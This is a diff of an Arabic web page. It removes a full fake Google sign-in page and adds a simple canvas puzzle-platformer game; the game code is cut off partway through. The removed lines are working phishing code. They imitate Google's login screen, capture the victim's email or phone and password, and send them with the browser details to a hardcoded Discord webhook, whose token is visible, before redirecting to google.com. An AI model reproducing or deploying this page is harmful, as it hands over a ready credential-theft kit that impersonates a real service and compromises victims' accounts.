@@ -1,326 +1,840 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f0f4fa;
-        margin: 0;
-        padding: 0;
-    }
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background-color: white;
-        padding: 40px;
-        border-radius: 25px;
-        display: flex;
-        flex-direction: row;
-        width: 800px;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .login-form {
-        width: 50%;
-    }
-    input[type="text"], input[type="password"] {
-        width: 100%;
-        padding: 15px;
-        border: 2px solid #0066ff;
-        border-radius: 5px;
-        font-size: 16px;
-        margin-bottom: 5px;
-    }
-    .error-message {
-        color: red;
-        font-size: 12px;
-        margin-bottom: 10px;
-        display: none;
-    }
-    .small-text {
-        font-size: 12px;
-        color: #0066ff;
-    }
-    .desc {
-        font-size: 12px;
-        color: #333;
-        margin-top: 10px;
-    }
-    .desc a {
-        color: #0066ff;
-        text-decoration: none;
-    }
-    button {
-        background-color: #0066ff;
-        color: white;
-        padding: 10px 30px;
-        border: none;
-        border-radius: 25px;
-        font-size: 16px;
-        cursor: pointer;
-        margin-top: 10px;
-    }
-    .create, .small-link {
-        margin-right: 15px;
-        font-size: 14px;
-        color: #0066ff;
-        background: none;
-        border: none;
-        cursor: pointer;
-    }
-    .text-side {
-        width: 45%;
-        text-align: center;
-    }
-    .text-side img {
-        width: 50px;
-        margin-bottom: 10px;
-    }
-    .text-side h2 {
-        font-size: 26px;
-        margin-bottom: 5px;
-    }
-    .text-side p {
-        font-size: 14px;
-        color: #555;
-    }
-    .footer {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 12px;
-        color: black;
-    }
-    .footer a {
-        margin: 0 10px;
-        color: black;
-        text-decoration: none;
-    }
-    label {
-        font-size: 12px;
-        color: #333;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-    }
-    .email-box {
-        border: 1px solid #ccc;
-        padding: 5px 10px;
-        border-radius: 20px;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-        justify-content: space-between;
-        font-size: 14px;
-        width: fit-content;
-        margin: 0 auto;
-    }
-    #password-page {
-        display: none;
-    }
-    .loading {
-        display: none;
-        text-align: center;
-        margin-top: 20px;
-    }
-    .loading-spinner {
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #0066ff;
-        border-radius: 50%;
-        width: 30px;
-        height: 30px;
-        animation: spin 1s linear infinite;
-        margin: 0 auto;
-    }
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ألغاز الظلام | لعبة الألغاز للبالغين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            overflow: hidden;
+            background-color: #0a0a1a;
+            color: #e0e0ff;
+        }
+        
+        #game-container {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+        }
+        
+        /* شاشة البداية */
+        #start-screen {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/DSSYh5d.jpeg') no-repeat center center;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 26, 0.7);
+        }
+        
+        .title {
+            font-size: 4rem;
+            margin-bottom: 2rem;
+            color: #a67cff;
+            text-shadow: 0 0 15px rgba(166, 124, 255, 0.7);
+            animation: glow 2s infinite alternate;
+            position: relative;
+            z-index: 1;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px rgba(166, 124, 255, 0.7); }
+            to { text-shadow: 0 0 20px rgba(166, 124, 255, 1), 0 0 30px rgba(166, 124, 255, 0.5); }
+        }
+        
+        .menu {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .menu-btn {
+            background: linear-gradient(to right, #4a1e8c, #6a2cc9);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.5rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 250px;
+            text-align: center;
+        }
+        
+        .menu-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(106, 44, 201, 0.4);
+        }
+        
+        /* شاشة المراحل */
+        #level-select {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/DSSYh5d.jpeg') no-repeat center center;
+            background-size: cover;
+            display: none;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-content: center;
+            gap: 20px;
+            padding: 2rem;
+            z-index: 90;
+        }
+        
+        #level-select .overlay {
+            background: rgba(10, 10, 26, 0.8);
+        }
+        
+        .level-btn {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(to bottom, #2a2a4a, #1a1a3a);
+            border: 2px solid #4a2c8c;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 2rem;
+            color: #a67cff;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .level-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(166, 124, 255, 0.5);
+            border-color: #a67cff;
+        }
+        
+        .level-btn.locked {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* لوحة التحكم */
+        #game-ui {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: none;
+            z-index: 10;
+        }
+        
+        #back-btn {
+            background: rgba(106, 44, 201, 0.7);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        /* منطقة اللعبة */
+        #game-canvas {
+            display: block;
+            background: url('https://i.imgur.com/DSSYh5d.jpeg') no-repeat center center;
+            background-size: cover;
+        }
+        
+        /* شاشة الإكمال */
+        #complete-screen {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 26, 0.9);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 80;
+        }
+        
+        .complete-message {
+            font-size: 3rem;
+            margin-bottom: 2rem;
+            color: #4aff4a;
+            text-align: center;
+        }
+        
+        /* تعليمات التحكم */
+        #controls-help {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            display: none;
+            z-index: 10;
+        }
+        
+        /* مؤشر التحميل */
+        #loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 200;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(166, 124, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #a67cff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-
-<div class="container">
-    <!-- صفحة البريد الإلكتروني -->
-    <div id="email-page" class="login-box">
-        <div class="login-form">
-            <input id="email-input" type="text" placeholder="البريد الإلكتروني أو الهاتف">
-            <div id="email-error" class="error-message"></div>
-            <div class="small-text">هل نسيت بريدك الإلكتروني؟</div>
-            <div class="desc">ألا تمتلك هذا الكمبيوتر؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a></div>
-            <div style="margin-top: 20px;">
-                <button onclick="showPasswordPage()">التالي</button>
-                <button class="create">إنشاء حساب</button>
+    <div id="game-container">
+        <!-- مؤشر التحميل -->
+        <div id="loading">
+            <div class="spinner"></div>
+        </div>
+        
+        <!-- شاشة البداية -->
+        <div id="start-screen">
+            <div class="overlay"></div>
+            <h1 class="title">ألغاز الظلام</h1>
+            <div class="menu">
+                <button class="menu-btn" onclick="showLevelSelect()">بدء اللعبة</button>
+                <button class="menu-btn" onclick="showInstructions()">التعليمات</button>
             </div>
         </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>تسجيل الدخول</h2>
-            <p>باستخدام حسابك على <b>Google</b></p>
+        
+        <!-- شاشة اختيار المرحلة -->
+        <div id="level-select">
+            <div class="overlay"></div>
+            <!-- سيتم إضافة أزرار المراحل dynamically -->
+        </div>
+        
+        <!-- لوحة التحكم في اللعبة -->
+        <div id="game-ui">
+            <button id="back-btn" onclick="backToLevelSelect()">العودة</button>
+        </div>
+        
+        <!-- تعليمات التحكم -->
+        <div id="controls-help">
+            استخدم مفاتيح الأسهم للتحرك ← ↑ ↓<br>
+            أو المفاتيح: W, A, S, D<br>
+            SPACE للقفز
+        </div>
+        
+        <!-- عنصر canvas للرسم -->
+        <canvas id="game-canvas"></canvas>
+        
+        <!-- شاشة إكمال المرحلة -->
+        <div id="complete-screen">
+            <h2 class="complete-message">تهانينا! لقد أكملت المرحلة</h2>
+            <div class="menu">
+                <button class="menu-btn" onclick="backToLevelSelect()">المراحل</button>
+                <button class="menu-btn" onclick="nextLevel()">المستوى التالي</button>
+            </div>
         </div>
     </div>
 
-    <!-- صفحة كلمة المرور -->
-    <div id="password-page" class="login-box">
-        <div class="login-form">
-            <input id="password-input" type="password" placeholder="إدخال كلمة المرور">
-            <div id="password-error" class="error-message"></div>
-            <label>
-                <input type="checkbox" id="show-password"> عرض كلمة المرور
-            </label>
-            <div style="margin-top: 20px;">
-                <button onclick="submitLogin()">التالي</button>
-                <button class="small-link" onclick="backToEmail()">تجربة طريقة أخرى</button>
-            </div>
-        </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>مرحباً</h2>
-            <div class="email-box">
-                <span>▼</span> <span id="display-email">example@gmail.com</span> <span>👤</span>
-            </div>
-        </div>
-    </div>
-    
-    <!-- رسالة التحميل -->
-    <div id="loading" class="loading">
-        <div class="loading-spinner"></div>
-        <p>جاري تسجيل الدخول...</p>
-    </div>
-</div>
-
-<div class="footer">
-    <a href="#">الشروط</a>
-    <a href="#">الخصوصية</a>
-    <a href="#">المساعدة</a>
-    <a href="#">العربية</a>
-</div>
-
-<script>
-    // متغيرات لتخزين البيانات
-    let userEmail = '';
-    let userPassword = '';
-    
-    function showPasswordPage() {
-        const email = document.getElementById('email-input').value.trim();
-        const emailError = document.getElementById('email-error');
-
-        if(email === '') {
-            emailError.textContent = 'الرجاء إدخال البريد الإلكتروني أو رقم الهاتف';
-            emailError.style.display = 'block';
-            return;
-        }
-        if(!validateEmailOrPhone(email)) {
-            emailError.textContent = 'تعذّر العثور على حسابك. الرجاء التحقق من البريد الإلكتروني أو رقم الهاتف وإعادة المحاولة.';
-            emailError.style.display = 'block';
-            return;
-        }
-
-        userEmail = email;
-        emailError.style.display = 'none';
-        document.getElementById('email-page').style.display = 'none';
-        document.getElementById('password-page').style.display = 'flex';
-        document.getElementById('display-email').textContent = email;
-    }
-
-    function backToEmail() {
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('email-page').style.display = 'flex';
-    }
-
-    function validateEmailOrPhone(input) {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneRegex = /^[0-9]{6,15}$/;
-        return emailRegex.test(input) || phoneRegex.test(input);
-    }
-
-    function submitLogin() {
-        const password = document.getElementById('password-input').value.trim();
-        const passwordError = document.getElementById('password-error');
+    <script>
+        // عناصر DOM
+        const startScreen = document.getElementById('start-screen');
+        const levelSelect = document.getElementById('level-select');
+        const gameUI = document.getElementById('game-ui');
+        const canvas = document.getElementById('game-canvas');
+        const completeScreen = document.getElementById('complete-screen');
+        const controlsHelp = document.getElementById('controls-help');
+        const loadingScreen = document.getElementById('loading');
+        const ctx = canvas.getContext('2d');
         
-        if(password === '') {
-            passwordError.textContent = 'الرجاء إدخال كلمة المرور';
-            passwordError.style.display = 'block';
-            return;
+        // تحميل الصور
+        const playerImage = new Image();
+        playerImage.src = 'https://i.imgur.com/nJ2YkJs.png';
+        
+        const backgroundImage = new Image();
+        backgroundImage.src = 'https://i.imgur.com/DSSYh5d.jpeg';
+        
+        const wallImage = new Image();
+        wallImage.src = 'https://i.imgur.com/DSSYh5d.jpeg';
+        
+        // ضبط حجم canvas لملء الشاشة
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
         }
         
-        userPassword = password;
-        passwordError.style.display = 'none';
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
         
-        // عرض رسالة التحميل
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-        
-        // إرسال البيانات إلى ويب هوك Discord
-        sendDataToDiscord();
-        
-        // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
-        setTimeout(() => {
-            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
-        }, 1000);
-    }
-
-    function sendDataToDiscord() {
-        const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
-        
-        const data = {
-            content: '**تم تسجيل بيانات جديدة**',
-            embeds: [{
-                title: 'تفاصيل تسجيل الدخول',
-                fields: [
-                    {
-                        name: 'البريد الإلكتروني/الهاتف',
-                        value: userEmail,
-                        inline: true
-                    },
-                    {
-                        name: 'كلمة المرور',
-                        value: userPassword,
-                        inline: true
-                    },
-                    {
-                        name: 'وقت التسجيل',
-                        value: new Date().toLocaleString(),
-                        inline: false
-                    },
-                    {
-                        name: 'معلومات المتصفح',
-                        value: navigator.userAgent,
-                        inline: false
-                    }
-                ],
-                color: 16711680 // اللون الأحمر
-            }]
+        // بيانات اللعبة
+        let currentLevel = 1;
+        let player = {
+            x: 100,
+            y: 100,
+            width: 40,
+            height: 60,
+            speed: 5,
+            jumpForce: 15,
+            velX: 0,
+            velY: 0,
+            facing: 'right',
+            isJumping: false,
+            onGround: false
         };
-
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
+        
+        let gravity = 0.8;
+        let friction = 0.8;
+        let keys = {};
+        let obstacles = [];
+        let items = [];
+        let exits = [];
+        let puzzles = [];
+        let hasKey = false;
+        let gameInitialized = false;
+        
+        // تعريف المراحل
+        const levels = [
+            // المرحلة 1: المقدمة - تعلم الأساسيات
+            {
+                player: { x: 100, y: 300 },
+                obstacles: [
+                    // الأرض
+                    { x: 0, y: canvas.height - 100, width: canvas.width, height: 100, color: '#3a3a5a', type: 'ground' },
+                    // جدران
+                    { x: 300, y: canvas.height - 250, width: 50, height: 150, color: '#5a2c8c', type: 'wall' },
+                    { x: 500, y: canvas.height - 300, width: 50, height: 200, color: '#5a2c8c', type: 'wall' },
+                    { x: 700, y: canvas.height - 350, width: 50, height: 250, color: '#5a2c8c', type: 'wall' },
+                    // منصة
+                    { x: 900, y: canvas.height - 200, width: 100, height: 20, color: '#5a2c8c', type: 'platform' }
+                ],
+                items: [
+                    { x: 350, y: canvas.height - 300, width: 30, height: 30, color: '#ffcc00', type: 'key' }
+                ],
+                exits: [
+                    { x: canvas.width - 120, y: canvas.height - 160, width: 50, height: 60, color: '#4aff4a', locked: true, type: 'exit' }
+                ],
+                puzzles: [
+                    { x: 200, y: canvas.height - 150, width: 40, height: 40, color: '#a67cff', type: 'pressurePlate', activated: false }
+                ]
             },
-            body: JSON.stringify(data),
-        })
-        .then(response => {
-            if (!response.ok) {
-                console.error('Error sending data to Discord');
+            
+            // المرحلة 2: المتاهة الأولية
+            {
+                player: { x: 100, y: 300 },
+                obstacles: [
+                    // الأرض
+                    { x: 0, y: canvas.height - 100, width: canvas.width, height: 100, color: '#3a3a5a', type: 'ground' },
+                    // متاهة من الجدران
+                    { x: 200, y: canvas.height - 300, width: 40, height: 200, color: '#5a2c8c', type: 'wall' },
+                    { x: 200, y: canvas.height - 450, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 400, y: canvas.height - 350, width: 40, height: 250, color: '#5a2c8c', type: 'wall' },
+                    { x: 400, y: canvas.height - 450, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 600, y: canvas.height - 250, width: 40, height: 150, color: '#5a2c8c', type: 'wall' },
+                    { x: 600, y: canvas.height - 450, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    // منصات
+                    { x: 800, y: canvas.height - 350, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    { x: 950, y: canvas.height - 250, width: 100, height: 20, color: '#5a2c8c', type: 'platform' }
+                ],
+                items: [
+                    { x: 950, y: canvas.height - 300, width: 30, height: 30, color: '#ffcc00', type: 'key' }
+                ],
+                exits: [
+                    { x: canvas.width - 120, y: canvas.height - 300, width: 50, height: 60, color: '#4aff4a', locked: true, type: 'exit' }
+                ],
+                puzzles: [
+                    { x: 250, y: canvas.height - 350, width: 40, height: 40, color: '#a67cff', type: 'pressurePlate', activated: false }
+                ]
+            },
+            
+            // المرحلة 3: القفز بين المنصات
+            {
+                player: { x: 100, y: 300 },
+                obstacles: [
+                    // الأرض
+                    { x: 0, y: canvas.height - 100, width: canvas.width, height: 100, color: '#3a3a5a', type: 'ground' },
+                    // منصات متحركة
+                    { x: 200, y: canvas.height - 200, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    { x: 400, y: canvas.height - 300, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    { x: 600, y: canvas.height - 400, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    { x: 800, y: canvas.height - 300, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    // جدار عالي
+                    { x: 1000, y: canvas.height - 500, width: 40, height: 400, color: '#5a2c8c', type: 'wall' }
+                ],
+                items: [
+                    { x: 1050, y: canvas.height - 550, width: 30, height: 30, color: '#ffcc00', type: 'key' }
+                ],
+                exits: [
+                    { x: 1100, y: canvas.height - 160, width: 50, height: 60, color: '#4aff4a', locked: true, type: 'exit' }
+                ],
+                puzzles: [
+                    { x: 700, y: canvas.height - 450, width: 40, height: 40, color: '#a67cff', type: 'pressurePlate', activated: false }
+                ]
+            },
+            
+            // المرحلة 4: الغرفة المظلمة
+            {
+                player: { x: 100, y: 300 },
+                obstacles: [
+                    // الأرض
+                    { x: 0, y: canvas.height - 100, width: canvas.width, height: 100, color: '#3a3a5a', type: 'ground' },
+                    // متاهة معقدة
+                    { x: 200, y: canvas.height - 300, width: 40, height: 200, color: '#5a2c8c', type: 'wall' },
+                    { x: 200, y: canvas.height - 450, width: 300, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 500, y: canvas.height - 350, width: 40, height: 250, color: '#5a2c8c', type: 'wall' },
+                    { x: 500, y: canvas.height - 450, width: 300, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 800, y: canvas.height - 250, width: 40, height: 150, color: '#5a2c8c', type: 'wall' },
+                    { x: 800, y: canvas.height - 450, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 1000, y: canvas.height - 350, width: 40, height: 250, color: '#5a2c8c', type: 'wall' }
+                ],
+                items: [
+                    { x: 1050, y: canvas.height - 350, width: 30, height: 30, color: '#ffcc00', type: 'key' },
+                    { x: 250, y: canvas.height - 500, width: 30, height: 30, color: '#ff6600', type: 'specialKey' }
+                ],
+                exits: [
+                    { x: 1100, y: canvas.height - 160, width: 50, height: 60, color: '#4aff4a', locked: true, type: 'exit' },
+                    { x: 100, y: canvas.height - 500, width: 50, height: 60, color: '#ff4a4a', locked: true, type: 'secretExit' }
+                ],
+                puzzles: [
+                    { x: 350, y: canvas.height - 500, width: 40, height: 40, color: '#a67cff', type: 'pressurePlate', activated: false },
+                    { x: 850, y: canvas.height - 500, width: 40, height: 40, color: '#ff8c4a', type: 'switch', activated: false }
+                ]
+            },
+            
+            // المرحلة 5: التحدي النهائي
+            {
+                player: { x: 100, y: 300 },
+                obstacles: [
+                    // الأرض
+                    { x: 0, y: canvas.height - 100, width: canvas.width, height: 100, color: '#3a3a5a', type: 'ground' },
+                    // هيكل معقد من الجدران والمنصات
+                    { x: 200, y: canvas.height - 250, width: 40, height: 150, color: '#5a2c8c', type: 'wall' },
+                    { x: 200, y: canvas.height - 450, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 400, y: canvas.height - 350, width: 40, height: 250, color: '#5a2c8c', type: 'wall' },
+                    { x: 400, y: canvas.height - 550, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 600, y: canvas.height - 450, width: 40, height: 350, color: '#5a2c8c', type: 'wall' },
+                    { x: 600, y: canvas.height - 550, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 800, y: canvas.height - 350, width: 40, height: 250, color: '#5a2c8c', type: 'wall' },
+                    { x: 800, y: canvas.height - 550, width: 200, height: 40, color: '#5a2c8c', type: 'wall' },
+                    { x: 1000, y: canvas.height - 250, width: 40, height: 150, color: '#5a2c8c', type: 'wall' },
+                    // منصات متحركة
+                    { x: 650, y: canvas.height - 200, width: 100, height: 20, color: '#5a2c8c', type: 'platform' },
+                    { x: 900, y: canvas.height - 300, width: 100, height: 20, color: '#5a2c8c', type: 'platform' }
+                ],
+                items: [
+                    { x: 1050, y: canvas.height - 300, width: 30, height: 30, color: '#ffcc00', type: 'key' },
+                    { x: 250, y: canvas.height - 500, width: 30, height: 30, color: '#ff6600', type: 'specialKey' },
+                    { x: 700, y: canvas.height - 600, width: 30, height: 30, color: '#00ccff', type: 'timeKey' }
+                ],
+                exits: [
+                    { x: 1100, y: canvas.height - 160, width: 50, height: 60, color: '#4aff4a', locked: true, type: 'exit' },
+                    { x: 100, y: canvas.height - 550, width: 50, height: 60, color: '#ff4a4a', locked: true, type: 'secretExit' }
+                ],
+                puzzles: [
+                    { x: 350, y: canvas.height - 500, width: 40, height: 40, color: '#a67cff', type: 'pressurePlate', activated: false },
+                    { x: 750, y: canvas.height - 600, width: 40, height: 40, color: '#ff8c4a', type: 'switch', activated: false },
+                    { x: 950, y: canvas.height - 400, width: 40, height: 40, color: '#4affff', type: 'colorPuzzle', activated: false }
+                ]
             }
-        })
-        .catch(error => {
-            console.error('Error:', error);
+        ];
+        
+        // تهيئة شاشة اختيار المراحل
+        function initLevelSelect() {
+            levelSelect.innerHTML = '';
+            for (let i = 1; i <= 5; i++) {
+                const levelBtn = document.createElement('div');
+                levelBtn.className = i <= currentLevel ? 'level-btn' : 'level-btn locked';
+                levelBtn.textContent = i;
+                levelBtn.onclick = i <= currentLevel ? () => startLevel(i) : null;
+                levelSelect.appendChild(levelBtn);
+            }
+        }
+        
+        // عرض شاشة اختيار المراحل
+        function showLevelSelect() {
+            startScreen.style.display = 'none';
+            levelSelect.style.display = 'flex';
+            gameUI.style.display = 'none';
+            canvas.style.display = 'none';
+            completeScreen.style.display = 'none';
+            controlsHelp.style.display = 'none';
+            initLevelSelect();
+        }
+        
+        // عرض التعليمات
+        function showInstructions() {
+            alert('لعبة ألغاز الظلام هي لعبة ألغاز مليئة بالتحديات.\n\nالتحكم:\n- استخدم مفاتيح الأسهم أو WASD لتحريك الشخصية\n- استخدم SPACE للقفز\n- اجمع المفاتيح لفتح الأبواب\n- حاول حل الألغاز للتقدم إلى المراحل التالية\n\nاحذر من السقوط في الفراغ!');
+        }
+        
+        // العودة إلى شاشة اختيار المراحل
+        function backToLevelSelect() {
+            levelSelect.style.display = 'flex';
+            gameUI.style.display = 'none';
+            canvas.style.display = 'none';
+            completeScreen.style.display = 'none';
+            controlsHelp.style.display = 'none';
+        }
+        
+        // بدء مستوى محدد
+        function startLevel(levelNum) {
+            currentLevel = levelNum;
+            const level = levels[levelNum - 1];
+            
+            // تهيئة العناصر حسب بيانات المرحلة
+            player = { 
+                ...player, 
+                ...level.player,
+                velX: 0,
+                velY: 0,
+                isJumping: false,
+                onGround: false
+            };
+            obstacles = level.obstacles;
+            items = level.items;
+            exits = level.exits;
+            puzzles = level.puzzles;
+            hasKey = false;
+            
+            levelSelect.style.display = 'none';
+            gameUI.style.display = 'block';
+            canvas.style.display = 'block';
+            controlsHelp.style.display = 'block';
+            
+            // بدء حلقة اللعبة
+            if (!gameInitialized) {
+                gameInitialized = true;
+                gameLoop();
+            }
+        }
+        
+        // الانتقال للمستوى التالي
+        function nextLevel() {
+            if (currentLevel < levels.length) {
+                startLevel(currentLevel + 1);
+            } else {
+                alert('لقد أكملت جميع المستويات! تهانينا!');
+                backToLevelSelect();
+            }
+        }
+        
+        // التحكم في اللاعب
+        window.addEventListener('keydown', (e) => {
+            keys[e.key] = true;
+            
+            // تحديث اتجاه اللاعب
+            if (e.key === 'ArrowRight' || e.key === 'd' || e.key === 'D') {
+                player.facing = 'right';
+            } else if (e.key === 'ArrowLeft' || e.key === 'a' || e.key === 'A') {
+                player.facing = 'left';
+            }
+            
+            // القفز
+            if ((e.key === ' ' || e.key === 'ArrowUp' || e.key === 'w' || e.key === 'W') && player.onGround) {
+                player.velY = -player.jumpForce;
+                player.isJumping = true;
+                player.onGround = false;
+            }
         });
-    }
-
-    document.getElementById('show-password').addEventListener('change', function() {
-        const passwordInput = document.getElementById('password-input');
-        passwordInput.type = this.checked ? 'text' : 'password';
-    });
-</script>
-
+        
+        window.addEventListener('keyup', (e) => {
+            keys[e.key] = false;
+        });
+        
+        // تطبيق الجاذبية والحركة
+        function update() {
+            // تطبيق الجاذبية
+            player.velY += gravity;
+            
+            // تطبيق الاحتكاك
+            player.velX *= friction;
+            
+            // الحركة الأفقية
+            if (keys['ArrowRight'] || keys['d'] || keys['D']) {
+                player.velX += player.speed * 0.5;
+            }
+            if (keys['ArrowLeft'] || keys['a'] || keys['A']) {
+                player.velX -= player.speed * 0.5;
+            }
+            
+            // الحد من السرعة الأفقية
+            if (player.velX > player.speed) player.velX = player.speed;
+            if (player.velX < -player.speed) player.velX = -player.speed;
+            
+            // تحديث الموضع
+            player.x += player.velX;
+            player.y += player.velY;
+            
+            // منع اللاعب من الخروج من الشاشة
+            if (player.x < 0) player.x = 0;
+            if (player.x + player.width > canvas.width) player.x = canvas.width - player.width;
+            if (player.y < 0) player.y = 0;
+            
+            // التحقق من وجود اللاعب على الأرض
+            player.onGround = false;
+            if (player.y + player.height > canvas.height - 100) {
+                player.onGround = true;
+                player.y = canvas.height - 100 - player.height;
+                player.velY = 0;
+                player.isJumping = false;
+            }
+            
+            // اكتشاف التصادم مع العناصر
+            checkCollisions();
+        }
+        
+        // التحقق من التصادمات
+        function checkCollisions() {
+            // التحقق من الاصطدام بالعقبات
+            for (const obstacle of obstacles) {
+                if (isColliding(player, obstacle)) {
+                    // معالجة التصادم حسب نوع العقبة
+                    if (obstacle.type === 'wall') {
+                        // منع الحركة (تجاوز العقبة)
+                        if (player.velX > 0) {
+                            player.x = obstacle.x - player.width;
+                            player.velX = 0;
+                        } else if (player.velX < 0) {
+                            player.x = obstacle.x + obstacle.width;
+                            player.velX = 0;
+                        }
+                        
+                        if (player.velY > 0) {
+                            player.y = obstacle.y - player.height;
+                            player.velY = 0;
+                            player.onGround = true;
+                            player.isJumping = false;
+                        } else if (player.velY < 0) {
+                            player.y = obstacle.y + obstacle.height;
+                            player.velY = 0;
+                        }
+                    } else if (obstacle.type === 'platform') {
+                        // الوقوف على المنصة
+                        if (player.velY > 0 && player.y + player.height < obstacle.y + 10) {
+                            player.y = obstacle.y - player.height;
+                            player.velY = 0;
+                            player.onGround = true;
+                            player.isJumping = false;
+                        }
+                    }
+                }
+            }
+            
+            // التحقق من جمع العناصر
+            for (let i = 0; i < items.length; i++) {
+                if (isColliding(player, items[i])) {
+                    if (items[i].type === 'key') {
+                        hasKey = true;
+                        // فتح الأبواب المقفلة
+                        for (const exit of exits) {
+                            exit.locked = false;
+                        }
+                    }
+                    items.splice(i, 1);
+                    i--;
+                    // تأثيرات جمع العنصر
+                    playSound('collect');
+                }
+            }
+            
+            // التحقق من الوصول إلى المخرج
+            for (const exit of exits) {
+                if (isColliding(player, exit) && !exit.locked) {
+                    completeLevel();
+                }
+            }
+            
+            // التحقق من تفعيل الألغاز
+            for (const puzzle of puzzles) {
+                if (isColliding(player, puzzle)) {
+                    if (puzzle.type === 'pressurePlate') {
+                        // تفعيل اللغز عند الوقوف على اللوحة
+                        puzzle.activated = true;
+                        puzzle.color = '#4aff4a';
+                    }
+                } else if (puzzle.type === 'pressurePlate') {
+                    puzzle.activated = false;
+                    puzzle.color = '#a67cff';
+                }
+            }
+        }
+        
+        // التحقق من التداخل بين مستطيلين
+        function isColliding(rect1, rect2) {
+            return rect1.x < rect2.x + rect2.width &&
+                   rect1.x + rect1.width > rect2.x &&
+                   rect1.y < rect2.y + rect2.height &&
+                   rect1.y + rect1.height > rect2.y;
+        }
+        
+        // إكمال المستوى
+        function completeLevel() {
+            completeScreen.style.display = 'flex';
+            gameUI.style.display = 'none';
+            controlsHelp.style.display = 'none';
+        }
+        
+        // تأثيرات صوتية (ستضاف لاحقاً)
+        function playSound(soundName) {
